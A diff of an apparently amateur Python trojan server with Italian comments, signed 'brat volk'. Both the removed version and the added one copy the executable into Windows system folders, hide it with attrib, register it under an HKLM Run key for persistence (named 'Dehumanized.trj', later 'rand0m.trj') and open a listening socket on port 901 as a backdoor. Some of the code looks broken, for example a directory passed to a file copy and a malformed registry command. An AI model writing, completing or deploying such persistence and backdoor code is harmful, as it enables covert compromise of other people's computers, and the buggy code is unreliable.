@@ -1,28 +1,23 @@
 #!/usr/bin/python
 #brat volk
 #-------------------------------------------------------------------------------------------------------------
-#importiamo le librerie per interfacciarci con il sistema(os) e creare un socket(socket)
+#importiamo le librerie per interfacciarci con il sistema(os) , copiare il server e creare un socket(socket)
 import os
 import socket
+from shutil import copy
 
 class main:
-        #crea un file .bat che fornisce una persistenza al server.exe
-        file = open("C:\\nope.bat", "w")
-        file.write ("@echo off")
-        file.write ("@break off")
-        #copiamo server.exe nelle directory di sistema
-        file.write ("xcopy C:\\server.exe C:\\Windows")
-        file.write ("xcopy C:\\server.exe C:\\Windows\\System32")
-        file.write ("xcopy C:\\server.exe C:\\Windows\\System")
-        #nascondiamo server.exe
-        file.write ("attrib +h C:\\server.exe")
+        #troviamo la directory del server
+        dir_path = os.path.dirname(os.path.realpath(__file__))
+        file__name = os.path.basename(__file__)
+        #copiamo il server nelle directory di sistema
+        file_dest = "C:\\windows\\"
+        copy(dir_path, file_dest)
+        #nascondiamo il server
+        os.system("attrib +h C:\\server.exe")
         #aggiungiamo server.exe allo startup nel regedit
-        file.write ("REG ADD \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WINDOWS\\CurrentVersion\\Run\\Dehumanized.trj\",\"C:\Server.exe\"\n")\
-        #cancelliamo il file .bat
-        file.write ("del /s /q %O")
-        #salviamo e apriamo il file
-        file.close()
-        os.system("start C:\\nope.bat")
+        regcommand = "REG ADD \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WINDOWS\\CurrentVersion\\Run\\rand0m.trj\",\"C:\Windows\Server.exe\"\n"
+        os.system(regcommand)
         #definiamo un socket in ascolto sul port 901
         socket1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         socket1.bind((socket.gethostname(), 901))
